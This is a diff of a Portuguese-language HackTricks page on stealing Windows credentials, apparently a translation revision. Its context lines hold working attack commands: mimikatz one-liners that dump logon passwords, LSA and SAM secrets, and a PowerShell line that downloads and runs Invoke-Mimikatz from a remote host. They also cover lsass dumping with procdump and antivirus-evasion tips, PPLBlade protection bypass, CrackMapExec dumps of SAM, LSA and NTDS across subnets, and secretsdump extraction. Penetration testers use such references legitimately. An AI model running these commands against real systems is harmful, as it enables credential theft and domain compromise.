@@ -2,15 +2,15 @@
 
 <details>
 
-<summary><strong>Aprenda hacking AWS do zero ao avançado com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Outras maneiras de apoiar o HackTricks:
 
 * Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
@@ -28,7 +28,7 @@ lsadump::sam
 #One liner
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
-**Encontre outras coisas que o Mimikatz pode fazer** [**nesta página**](credentials-mimikatz.md)**.**
+**Encontre outras funcionalidades que o Mimikatz pode realizar** [**nesta página**](credentials-mimikatz.md)**.**
 
 ### Invoke-Mimikatz
 ```bash
@@ -36,7 +36,7 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
-[**Saiba mais sobre algumas possíveis proteções de credenciais aqui.**](credentials-protections.md) **Essas proteções podem impedir o Mimikatz de extrair algumas credenciais.**
+[**Saiba mais sobre algumas possíveis proteções de credenciais aqui.**](credentials-protections.md) **Essas proteções podem impedir que o Mimikatz extraia algumas credenciais.**
 
 ## Credenciais com Meterpreter
 
@@ -57,11 +57,11 @@ mimikatz_command -f "sekurlsa::logonpasswords"
 mimikatz_command -f "lsadump::lsa /inject"
 mimikatz_command -f "lsadump::sam"
 ```
-## Contornando AV
+## Bypassing AV
 
 ### Procdump + Mimikatz
 
-Como o **Procdump da** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**é uma ferramenta legítima da Microsoft**, não é detectado pelo Defender.\
+Como o **Procdump da** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**é uma ferramenta legítima da Microsoft**, não é detectado pelo Defender.\
 Você pode usar essa ferramenta para **fazer dump do processo lsass**, **baixar o dump** e **extrair** as **credenciais localmente** do dump.
 
 {% code title="Dump lsass" %}
@@ -83,7 +83,7 @@ mimikatz # sekurlsa::logonPasswords
 ```
 {% endcode %}
 
-Este processo é feito automaticamente com o [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
+Este processo é feito automaticamente com [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
 **Nota**: Alguns **AV** podem **detectar** como **malicioso** o uso do **procdump.exe para fazer dump do lsass.exe**, isso ocorre porque estão **detectando** as strings **"procdump.exe" e "lsass.exe"**. Portanto, é mais **discreto** **passar** como **argumento** o **PID** do lsass.exe para o procdump **em vez de** o **nome lsass.exe.**
 
@@ -116,13 +116,13 @@ Get-Process -Name LSASS
 ```
 ## Despejando lsass com PPLBlade
 
-[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) é uma ferramenta de despejo de Processo Protegido que suporta a obfuscação do despejo de memória e a transferência para estações de trabalho remotas sem salvá-lo no disco.
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) é uma ferramenta de despejo de Processo Protegido que suporta a obfuscação do despejo de memória e a transferência para estações de trabalho remotas sem gravá-lo no disco.
 
 **Funcionalidades principais**:
 
 1. Bypass da proteção PPL
 2. Obfuscação de arquivos de despejo de memória para evitar mecanismos de detecção baseados em assinaturas do Defender
-3. Upload de despejo de memória com métodos de upload RAW e SMB sem salvá-lo no disco (despejo sem arquivo)
+3. Upload de despejo de memória com métodos de upload RAW e SMB sem gravá-lo no disco (despejo sem arquivo)
 
 {% code overflow="wrap" %}
 ```bash
@@ -140,7 +140,7 @@ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
-### Extrair o NTDS.dit do DC alvo
+### Extrair o NTDS.dit do DC de destino
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
@@ -170,7 +170,7 @@ reg save HKLM\security security
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
-### Volume Shadow Copy
+### Cópia de Sombra de Volume
 
 Você pode realizar a cópia de arquivos protegidos usando este serviço. Você precisa ser Administrador.
 
@@ -218,7 +218,7 @@ Dentro deste banco de dados, três tabelas principais são mantidas:
 
 Mais informações sobre isso: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-O Windows usa o _Ntdsa.dll_ para interagir com esse arquivo e é usado pelo _lsass.exe_. Então, **parte** do arquivo **NTDS.dit** pode estar localizada **dentro da memória do `lsass`** (você pode encontrar os dados acessados mais recentemente provavelmente devido à melhoria de desempenho ao usar um **cache**).
+O Windows usa _Ntdsa.dll_ para interagir com esse arquivo e é usado pelo _lsass.exe_. Então, **parte** do arquivo **NTDS.dit** pode estar localizada **dentro da memória do `lsass`** (você pode encontrar os dados acessados mais recentemente provavelmente devido à melhoria de desempenho ao usar um **cache**).
 
 #### Descriptografando os hashes dentro do NTDS.dit
 
@@ -236,11 +236,11 @@ Disponível desde o Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-Você também pode usar o truque do **volume shadow copy** para copiar o arquivo **ntds.dit**. Lembre-se de que você também precisará de uma cópia do arquivo **SYSTEM** (novamente, [**extraia do registro ou use o truque do volume shadow copy**](./#stealing-sam-and-system)).
+Você também pode usar o truque do [**volume shadow copy**](./#stealing-sam-and-system) para copiar o arquivo **ntds.dit**. Lembre-se de que você também precisará de uma cópia do arquivo **SYSTEM** (novamente, [**faça o dump do registro ou use o truque do volume shadow copy**](./#stealing-sam-and-system)).
 
 ### **Extraindo hashes do NTDS.dit**
 
-Depois de ter **obtido** os arquivos **NTDS.dit** e **SYSTEM**, você pode usar ferramentas como _secretsdump.py_ para **extrair os hashes**:
+Depois de ter **obtido** os arquivos **NTDS.dit** e **SYSTEM**, você pode usar ferramentas como o _secretsdump.py_ para **extrair os hashes**:
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
@@ -254,7 +254,7 @@ Por fim, você também pode usar o **módulo metasploit**: _post/windows/gather/
 
 ### **Extraindo objetos de domínio do NTDS.dit para um banco de dados SQLite**
 
-Objetos NTDS podem ser extraídos para um banco de dados SQLite com [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Não apenas segredos são extraídos, mas também os objetos inteiros e seus atributos para uma extração de informações mais detalhada quando o arquivo NTDS.dit bruto já foi recuperado.
+Objetos NTDS podem ser extraídos para um banco de dados SQLite com [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Não apenas segredos são extraídos, mas também os objetos inteiros e seus atributos para extração de informações adicionais quando o arquivo NTDS.dit bruto já foi recuperado.
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
@@ -274,7 +274,7 @@ Esta ferramenta pode ser usada para extrair credenciais da memória. Faça o dow
 
 ### fgdump
 
-Extrair credenciais do arquivo SAM
+Extrai credenciais do arquivo SAM
 ```
 You can find this binary inside Kali, just do: locate fgdump.exe
 fgdump.exe
@@ -301,10 +301,10 @@ Baixe em: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/sec
 
 Outras maneiras de apoiar o HackTricks:
 
-* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
